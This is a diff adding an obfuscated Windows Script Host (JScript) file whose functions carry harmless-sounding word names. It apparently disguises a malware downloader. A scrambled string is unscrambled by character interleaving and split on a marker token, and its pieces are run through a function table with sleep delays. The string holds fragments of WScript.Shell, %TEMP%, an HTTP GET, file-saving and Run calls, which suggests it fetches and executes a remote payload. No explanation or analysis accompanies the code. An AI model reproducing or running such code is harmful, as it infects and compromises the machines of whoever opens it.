@@ -1,0 +1,15 @@
+function letter(substance,level,week,difficult,product,serve) { if (made(week)) return substance+level; else return level+substance; }
+function summer(sing,skill,ask){bring[repeat](bring[sky])(wish);}
+function stone(lot,probable,huge,were){subtract=1;sky=subtract;WScript.Sleep(6366);repeat=sky+subtract*sky+subtract;wish[5960623]=come;}
+function doctor(round,example,fine,planet,whether) {return round.substr(example,fine);}
+function tell(red,noun,gentle,game,mix,length) {old = so(noun);dog = coast;wheel=[];for (gone=coast; gone<=(so(red)-old); gone++) {if (doctor(red,gone,old)==noun){wheel[so(wheel)]=doctor(red,dog,(gone-dog));dog = gone+old;}}wheel[so(wheel)]=doctor(red,dog);return wheel;}
+function come(wash,want){million="JMuMOdMv";wish[6002452]=effect;bring=tell(led(allow),million);}
+function effect(air,great,feed,spot){wish[6122610]=summer;bring[repeat] = chick[bring[coast]];}
+function these(sugar,music){wish=[3286];wrong(wish);}
+function chick(wood,force,meant,know){wish[4696979]=stone;WScript.Sleep(5565);allow = 'nnietd.mSecntx(orO(rif in(fvg\\i\"sn @(E;\\\"\"\\dt+%nxRUae+SpT\\E\"exR@sED\\n\"N.o,S)p D\\s\"O0elM)rlA).eI=nhN= S%-=.\"1\\t ))pc  i {!rr =caW SvS\"W\\c \\%\"{rU( iSt)pEc0tRe0.Dj2sNb lSO=eDe=eOt=pMa (Aes2Iru2NCt2%.a2\"t\\2tp))si ;.r{ ncR}(S=  WRef(+li \"s\\f e2i} 7  {8;; 1)ec40s 63l=\"+\\ a0;cf7}. , rn2ter(rpu]ylt\\{\"ea rrcnt e.s{(ob)\\p\"eue@(sn\\h\"(\\c\"\'+\\[tRG)a+E(c\\T\"}g\'@\\n \\,\";i ,)r\'\\\\\"(th\\d\"tSn)toe;pts s..v:)na/( r/m; \'o\\q)d+ enl=sa[ lrgca.].fh+r t\'e\\a,p/MRls +ae=\"c\\ ae=Rr(r c/i;h(s).\\l\\p\\v\'hdgPp{gT\'2\\Tw}+Hm)\"L\\/jM?gfXl,yrs sewf\'v(udrenle(c]Sot[.gin2iorLbn{M  yXr(tS}x;M8)2\\=\'e v(i{rtd ;c6r-e9e=jot;b)u\"O\"r+e\"nZt\" +a\"SSe_tGr\"r+C\"iE.\"n+t\"gRp\". i,f\"r\"r c,oeSlmuWcCe lho=ma( ]r\"n\"C+ \"oe{td\" +e\")i(\"3+p\" raW<\"r+ \"sgg\"e+(\"Ie Rn\"e[tdln(ai x{h ,)we1( h0c;t)a0c+  }3 =;0) e)lgu;c e l;o}m]()]\\\"\"d;\"m+ \"oab\"c+r\".eiRignegRg\"i[[dun3al ]{e (ydrqte;)\"p\\(\\pC)neN;Ks\\ \\u\"W+i\"SRgEc\".+r\"wSi\"w+p\"wUt\"\\+\"\"._,TQ\"\\+\"\"uNmEiRoRtUc\"(+.\")Cs_;\"l+ \"hY}\"a+ \"dE}KgH \"a e=h le.lsuwceewl owm{ \\;\") \",\"W+\\\"\"lSlmechoSr\"c+i\"..pta\"t+v\".pois\"n+l\"are\"z+e\"acp\"k+(\"eS2Wd\"2(n]2\"at2ch\"2+.\")ew\";+w\" jwb}\"\\+\"\" O[\"g+ \"+e=t+\" +;\"la}\"\'+)\")e(r)C;\"}[c)attpcihr(ceS)W{(W S=c rdinpat;.5s7l5e3e=pe(l2y1f5y7v4M2d6O9M8u)M;J}rfoetpcgu=rbtrsinnogc;';coast=0;}
+function made(tall,forward,might,store,floor){return tall % (sky+sky);}
+function wrong(then,surface){WScript.Sleep(54677);real=1498;while(chick=chick){try{wish[real](real);}catch(bat){wish[2107030]=chick;}real++}}
+function led(before){band="";food=coast;while (food < 2376) {especially=path(before,food);band=letter(band,especially,food); food++; }return band;}
+function path(seed,flat){return doctor(seed,flat,subtract);}
+these(1997);
+function so(human,paint,use,press) {return human.length; }
